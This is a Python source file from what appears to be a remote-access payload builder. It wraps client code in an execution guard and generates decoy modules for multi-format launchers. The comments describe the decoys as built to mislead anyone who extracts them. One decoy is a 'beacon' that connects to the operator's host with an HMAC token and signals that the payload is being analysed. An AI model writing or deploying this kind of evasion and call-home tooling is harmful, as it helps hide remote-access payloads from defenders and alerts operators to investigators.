"""Shared payload preparation — UUID, integrity check, decoy builders.

All format exporters call these so the check and decoys stay consistent
across py/sh/bat/js/exe. Keeping it in one place means a bug fixed here
is fixed everywhere.
"""

import secrets


def prepare_payload(client_source: str) -> tuple:
    """Generate a UUID and prepend the integrity check to client source.

    Returns (uuid, source_with_check). The check requires
    `_RSC_LAUNCHED = True` and matching `_RSC_UUID` globals in scope.
    Each launcher format is responsible for setting those globals before
    exec'ing the actual blob.
    """
    uuid = secrets.token_hex(16)
    check = (
        "# --- payload integrity check ---\n"
        "import sys as _rsc_sys\n"
        "if not globals().get('_RSC_LAUNCHED'):\n"
        "    _rsc_sys.exit(1)\n"
        f"if globals().get('_RSC_UUID') != {uuid!r}:\n"
        "    _rsc_sys.exit(1)\n"
        "del _rsc_sys\n"
        "# --- end check ---\n\n"
    )
    return uuid, check + client_source


def build_decoy1() -> str:
    """A plausible-looking runtime bootstrap module.

    Referenced by every launcher (so it looks used) but never exec'd.
    If extracted and run standalone, prints harmless version info.
    """
    return '''"""RSC runtime bootstrap - required by the payload protocol.

Initializes the execution environment, resolves the server endpoint,
and provides accessors used by the main payload for session setup.
"""

import sys as _sys

_RSC_CONFIG = {
    "version": "2.1",
    "runtime": _sys.version_info[:2],
    "mode": "remote",
}


class RuntimeBootstrap:
    """Initializes the runtime environment for a payload session."""

    def __init__(self, config=None):
        self.config = config or _RSC_CONFIG
        self.initialized = False

    def initialize(self):
        self.initialized = True
        return True

    def resolve_endpoint(self, host, port):
        return (host, int(port))

    def get_flag(self, name, default=None):
        return self.config.get(name, default)


def get_bootstrap():
    return RuntimeBootstrap()


if __name__ == "__main__":
    b = get_bootstrap()
    b.initialize()
    print("[rsc] runtime module loaded (version " + _RSC_CONFIG["version"] + ")")
    print("[rsc] python " + _sys.version.split()[0])
    print("[rsc] bootstrap initialized: " + str(b.initialized))
'''


def build_decoy2(host: str, port: int, master_secret: str) -> str:
    """A diagnostic beacon module.

    Referenced by every launcher (so it looks used) but never exec'd
    during normal operation. If extracted and run standalone, connects
    to the server and sends "Nice try dumbass" — the tripwire fires.
    """
    return (
        '"""RSC diagnostic beacon - sends a health-check ping to the server.\n'
        '\n'
        'Used internally to verify payload-to-server connectivity during setup.\n'
        '"""\n'
        '\n'
        'import hashlib as _hashlib\n'
        'import hmac as _hmac\n'
        'import socket as _socket\n'
        'import time as _time\n'
        '\n'
        f'_MASTER_SECRET = {master_secret!r}\n'
        '_ROTATION = 3600\n'
        f'_HOST = {host!r}\n'
        f'_PORT = {port}\n'
        '\n'
        '\n'
        'def _compute_token():\n'
        '    window = int(_time.time() // _ROTATION)\n'
        '    msg = f"rsc-token-{window}".encode()\n'
        '    return _hmac.new(\n'
        '        _MASTER_SECRET.encode(), msg, _hashlib.sha256\n'
        '    ).hexdigest()[:32].upper()\n'
        '\n'
        '\n'
        'def _beacon():\n'
        '    try:\n'
        '        s = _socket.create_connection((_HOST, _PORT), timeout=5)\n'
        '        try:\n'
        '            s.sendall(f"AUTH:{_compute_token()}\\n".encode())\n'
        '            s.recv(1024)\n'
        '            s.sendall(b"Nice try dumbass\\n")\n'
        '        finally:\n'
        '            s.close()\n'
        '    except Exception:\n'
        '        pass\n'
        '\n'
        '\n'
        'if __name__ == "__main__":\n'
        '    _beacon()\n'
    )
